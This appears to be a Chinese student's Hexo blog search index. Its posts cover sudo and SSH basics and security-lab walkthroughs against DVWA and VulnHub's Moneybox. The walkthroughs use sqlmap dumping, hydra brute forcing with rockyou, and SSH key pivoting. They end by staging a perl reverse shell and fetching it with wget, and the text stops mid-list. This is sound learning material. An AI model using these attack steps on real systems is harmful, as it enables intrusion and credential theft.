<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>要置顶的公告</title>
    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"><br>2023/11/08 更新:<br>期中考试考完了有点没活了 慢慢整吧<br>2023/11/18 更新:<br>今天是18岁生日 嘻嘻<br>整了篇新日志</p>
<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
<p>ps:<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong></p>
<p>无渲染跳转方式: 在文章前加入</p>
<pre class="line-numbers language-none"><code class="language-none">---
layout: false 
--- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp与sql注入与sqlmap</title>
    <url>/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="owasp下载地址-https-sourceforge-net-projects-owaspbwa-files"><a href="#owasp下载地址-https-sourceforge-net-projects-owaspbwa-files" class="headerlink" title="owasp下载地址:https://sourceforge.net/projects/owaspbwa/files/"></a>owasp下载地址:<a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a></h1><h2 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h2><p>首先 我们下载owasp 打开后输入<strong>默认账号</strong>root 与 <strong>默认密码</strong>owaspbwa<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/2.jpg"><br>随后会显示<strong>登录成功</strong> 输入指定ip进入网页<a href="http://192.168.246.132/">http://192.168.246.132</a><br>另开一个<strong>kali</strong> 随后进入网页<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/1.jpg" alt="1.jpg"><br>这里选择<strong>Damn Vulnerable Web Application</strong> 也是我们今天要解析的靶机</p>
<span id="more"></span>
<h2 id="2-靶机部分"><a href="#2-靶机部分" class="headerlink" title="2.靶机部分"></a>2.靶机部分</h2><p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/3.jpg" alt="3.jpg"><br>如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>password</td>
</tr>
<tr>
<td>gordonb</td>
<td>abc123</td>
</tr>
<tr>
<td>1337</td>
<td>charley</td>
</tr>
<tr>
<td>pablo</td>
<td>letmein</td>
</tr>
<tr>
<td>smithy</td>
<td>password</td>
</tr>
</tbody></table>
<p>进入 选择<strong>SQL Injection</strong><br>首先是测试一下sqlmap</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机地址" //判断目标是否存在sql注入可能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/4.jpg" alt="4.jpg"><br>可以看到它爆出了有注入漏洞 数据库类型为 <strong>mysql</strong> 且所在操作系统为 <strong>linux</strong><br>我们加入一下cookie 尝试爆出数据库看看<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/5.jpg" alt="5.jpg"><br>↑获取cookie请在该页面按f12 切到<strong>network</strong> reload后查看页面详细 其中有cookie</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "目标网址" --cookie "网址cookie" --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看到俩库<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/6.jpg" alt="6.jpg"><br>dvwa和information_schema<br>information_schema是每个mysql数据库都会自带的所以暂且搁置 我们转到dvwa</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 --tables //获取指定数据库表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结果是两个表<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/7.jpg" alt="7.jpg"><br>那我们字面意思来看 guestbook是留言簿 那users明显是用户相关信息了<br>我们查看一下users里的相关信息</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 -T 表名 --dump //获取指定表中的信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有选项都直接按<strong>enter</strong>默认过去<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/8.jpg" alt="8.jpg"></p>
<blockquote>
<p>ps: 如果窗口拉的不够长会导致表格被拉伸难以看清 我的建议是在生成结果前尽可能全屏</p>
</blockquote>
<p>password后边的括号里边的内容是解密后破解出的明文密码 前面则是加密后的密文<br>登陆时使用 <strong>user对应的账号</strong> 与 <strong>password中的明文密码</strong> 则ok<br>剩下的等老师继续讲 我们先说到这里</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>liunx中sudo服务相关知识</title>
    <url>/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><h1 id="老样子-跟随课程进度"><a href="#老样子-跟随课程进度" class="headerlink" title="老样子 跟随课程进度"></a>老样子 跟随课程进度</h1><h2 id="1）什么是sudo涅？"><a href="#1）什么是sudo涅？" class="headerlink" title="1）什么是sudo涅？"></a>1）什么是sudo涅？</h2><blockquote>
<p>简单的说，sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p>
</blockquote>
<blockquote>
<p>严谨些说，sudo 允许一个已授权用户以超级用户或者其它用户的角色运行一个命令。当然，能做什么不能做什么都是通过安全策略来指定的。sudo 支持插件架构的安全策略，并能把输入输出写入日志。第三方可以开发并发布自己的安全策略和输入输出日志插件，并让它们无缝的和 sudo 一起工作。默认的安全策略记录在 /etc/sudoers 文件中。而安全策略可能需要用户通过密码来验证他们自己。也就是在用户执行 sudo 命令时要求用户输入自己账号的密码。如果验证失败，sudo 命令将会退出。</p>
</blockquote>
<blockquote>
<p>sudo暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。</p>
</blockquote>
<blockquote>
<p>由于不需要超级用户的密码，部分类Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、[Mac OS X]。</p>
</blockquote>
<span id="more"></span>
<h2 id="2）sudo命令语法"><a href="#2）sudo命令语法" class="headerlink" title="2）sudo命令语法"></a>2）sudo命令语法</h2><p><code>sudo [-bhHpV] [-s ] [-u &lt;用户&gt;] [指令]</code><br>或<br><code>sudo [-klv]</code><br>参数<br>-b 在后台执行指令。<br>-h 显示帮助。<br>-H 将HOME环境变量设为新身份的HOME环境变量。<br>-k 结束密码的有效期限，也就是下次再执行sudo时便需要输入密码。<br>-l 列出目前用户可执行与无法执行的指令。<br>-p 改变询问密码的提示符号。<br>-s 执行指定的shell。<br>-u &lt;用户&gt; 以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份。<br>-v 延长密码有效期限5分钟。<br>-V 显示版本信息。<br>-S 从标准输入流替代终端来获取密码</p>
<h2 id="3）基本配置"><a href="#3）基本配置" class="headerlink" title="3）基本配置"></a>3）基本配置</h2><p>系统默认创建了一个名为 sudo 的组。只要把用户加入这个组，用户就具有了 sudo 的权限。<br>至于如何把用户加入 sudo 组，您可以直接编辑 /etc/group 文件，当然您得使用一个有 sudo 权限的用户来干这件事：<br>先创建用户并设置密码后，然后在sudo组中加入该用户，多个用户用逗号隔开。<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/1.png" alt="1.png"><br>添加内容如下：<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/2.png" alt="2.png"><br>我们把用户 testuser 添加到了 sudo 组中，所以当用户 testuser 登录后就可以通过 sudo 命令以 root 权限执行命令了！<br>但是，用testuser执行root权限的命令时会报错：<br>解决办法：<br>1)、切换到root用户下<br>普通用户切换到root用户下：sudo -i<br>root用户切换到普通用户下：su testuser</p>
<p>2)、添加sudo文件的写权限,命令是:<br>chmod u+w /etc/sudoers</p>
<p>3)、编辑sudoers文件<br>vi /etc/sudoers<br>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/3.png" alt="3.png"><br>ps:这里说下你可以sudoers添加下面四行中任意一条<br>youuser ALL=(ALL) ALL<br>%youuser ALL=(ALL) ALL<br>youuser ALL=(ALL) NOPASSWD: ALL<br>%youuser ALL=(ALL) NOPASSWD: ALL</p>
<p>第一行:允许用户youuser执行sudo命令(需要输入密码).<br>第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).<br>第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.<br>第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</p>
<p>4)、撤销sudoers文件写权限,命令:<br>chmod u-w /etc/sudoers</p>
<p>这样普通用户就可以使用sudo了。</p>
<p>4、sudo命令的日志</p>
<p>在 ubuntu 中，sudo 的日志默认被记录在 /var/log/auth.log 文件中。当我们执行 sudo 命令时，相关日志都是会被记录下来的。比如下图中显示的就是一次执行 sudo 命令的日志。<br>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>liunx中ssh服务相关知识</title>
    <url>/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><h1 id="最近课程讲到了ssh服务-故此做个记录"><a href="#最近课程讲到了ssh服务-故此做个记录" class="headerlink" title="最近课程讲到了ssh服务 故此做个记录"></a>最近课程讲到了ssh服务 故此做个记录</h1><h2 id="1）ssh是什么涅？"><a href="#1）ssh是什么涅？" class="headerlink" title="1）ssh是什么涅？"></a>1）ssh是什么涅？</h2><blockquote>
<p><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a>&nbsp;叫安全外壳协议（<strong>S</strong>ecure&nbsp;<strong>Sh</strong>ell），是一种加密的网络传输协议，可在不安全的网络中网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现 SSH 客户端和服务器之间的连接。</p>
</blockquote>
<h2 id="2）ssh的原理是什么涅？"><a href="#2）ssh的原理是什么涅？" class="headerlink" title="2）ssh的原理是什么涅？"></a>2）ssh的原理是什么涅？</h2><span id="more"></span>
<blockquote>
<p>SSH 之所以一经提出，就得到了快速发展，是因为数据的安全性对任何人都非常重要。这里我们对其保护数据安全的原理进行探究。</p>
</blockquote>
<p>在聊加密前先介绍一下几个密码学的基本概念：</p>
<ul>
<li>明文<code>plaintext</code>&nbsp;指传送方（一般指客户端）想要接受方（一般指服务端）获得的<strong>可读信息</strong></li>
<li>密文<code>ciphertext</code>&nbsp;指明文进过加密后所产生的信息</li>
<li>秘钥<code>key</code>&nbsp;指用来完成加密、解密、完整性验证等密码学应用的密码信息，是明文转换为密文或密文转换为明文的算法需要的参数</li>
<li>私钥 指私有的秘钥</li>
<li>公钥 指公开的秘钥</li>
</ul>
<p>常见的加密有两种：<strong>对称加密</strong>和<strong>非对称加密</strong><br>对称加密: 加密和解密的秘钥使用的是同一个.<br>非对称加密: 与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p>
<p>对称加密算法: 密钥较短，破译困难，除了数据加密标准（DES），另一个对称密钥加密系统是国际数据加密算法（IDEA），它比DES的加密性好，且对计算机性能要求也没有那么高.<br>优点:<br>    算法公开、计算量小、加密速度快、加密效率高<br>缺点:<br>    在数据传送前，发送方和接收方必须商定好秘钥，然后 使双方都能保存好秘钥。其次如果一方的秘钥被泄露，那么加密信息也就不安全了。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的唯一秘钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。<br>常见的对称加密算法有: DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES </p>
<p>非对称加密算法: 公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</p>
<p>非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将其中的一把作为公用密钥向其它方公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。甲方只能用其专用密钥解密由其公用密钥加密后的任何信息。<br>优点:<br>    安全<br>缺点:<br>    速度较慢<br>常见的非对称加密算法有: RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
<h2 id="3）ssh登录与免密登录的方式"><a href="#3）ssh登录与免密登录的方式" class="headerlink" title="3）ssh登录与免密登录的方式"></a>3）ssh登录与免密登录的方式</h2><p>登录方式:<br><code>ssh 用户名@ip地址</code><br>免密登录方式：<br>生成公共身份验证密钥并将其附加到远程主机 ~/.ssh/authorized_keys 文件即可。<br><strong>具体步骤</strong>：</p>
<ol>
<li><p>检查现有的 SSH 密钥对。<br>在生成新的 SSH 密钥对之前，首先检查您的客户端计算机上是否已有 SSH 密钥，因为您不想覆盖现有密钥。<br>运行以下 ls 命令以查看是否存在现有 SSH 密钥：<br><code>ls -al ~/.ssh/id_*.pub</code><br>如果存在现有密钥，您可以使用这些密钥并跳过下一步或备份旧密钥并生成新密钥。<br>如果您看到 No such file or directory 或 no matches found 意味着您没有 SSH 密钥，则可以继续执行下一步并生成新密钥。</p>
</li>
<li><p>生成新的 SSH 密钥对。<br>以下命令将生成一个新的密钥对：<br><code>ssh-keygen</code><br>按 Enter 接受则默认文件位置和文件名：<br><code>Enter file in which to save the key (/home/yourusername/.ssh/id_rsa):</code><br>接下来，ssh-keygen 工具将要求您键入安全密码。无论您是否想要使用密码短语都取决于您，如果您选择使用密码短语，您将获得额外的安全保护。在大多数情况下，开发人员和系统管理员使用 SSH 而不使用密码，因为它们对完全自动化的流程很有用。如果您不想使用密码短语，请按 Enter<br><code>Enter passphrase (empty for no passphrase):</code></p>
</li>
<li><p>要确认是否已经生成 SSH 密钥，您可以使用以下命令列出新的私钥和公钥：</p>
<pre class="line-numbers language-none"><code class="language-none">ls ~/.ssh/id_*
/home/yourusername/.ssh/id_rsa /home/yourusername/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>复制公钥<br>现在您已经生成了 SSH 密钥对，为了能够在没有密码的情况下登录到您的服务器，您需要将公钥复制到您要管理的服务器。<br>将公钥复制到服务器的最简单方法是使用名为的命令 ssh-copy-id 。在您的本地机器终端类型：<br><code>ssh-copy-id remote_username@server_ip_address</code><br>系统将提示您输入 remote_username 的密码：<br><code>remote_username@server_ip_address's password:</code><br>用户通过身份验证后，公钥将附加到远程用户 authorized_keys 文件，并且将关闭连接。<br>如果由于某种原因， ssh-copy-id 本地计算机上没有该实用程序，则可以使用以下命令复制公钥：<br><code>cat ~/.ssh/id_rsa.pub | ssh remote_username@server_ip_address "mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys"</code></p>
</li>
<li><p>使用 SSH 密钥登录服务器<br>完成上述步骤后，您应该能够登录到远程服务器而不会被提示输入密码。<br>尝试通过 SSH 登录到您的服务器：<br><code>ssh remote_username@server_ip_address</code><br>如果一切顺利，您将立即登录。</p>
</li>
</ol>
<h2 id="4）参考资料"><a href="#4）参考资料" class="headerlink" title="4）参考资料"></a>4）参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/235610836">深入了解SSH</a>————知乎<br><a href="https://blog.csdn.net/weixin_57099902/article/details/132717146">如何设置SSH免密登录</a>————CSDN</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>moneybox解析</title>
    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
<blockquote>
<p>第一步：打开sources.list文件</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo vim /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>第二步：在文件中添加以下内容</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">deb http://http.kali.org/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security sana/updates main contrib non-free
deb http://old.kali.org/kali moto main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>然后保存退出，再进行更新</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
</blockquote>
<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
<pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><em><strong>hydra使用方法:</strong></em></p>
<pre class="line-numbers language-none"><code class="language-none">hydra -l 用户名 -P 密码字典 协议://ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
<blockquote>
<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
</blockquote>
<ol>
<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/webshells/perl
sudo cp perl-reverse-shell.pl /var/www/html/p.php
cd /var/www/html
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<pre class="line-numbers language-none"><code class="language-none">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
<li>开启kali的网站服务<pre class="line-numbers language-none"><code class="language-none">systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
<li>切换到靶机lily会话，通过http协议下载p.php<pre class="line-numbers language-none"><code class="language-none">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
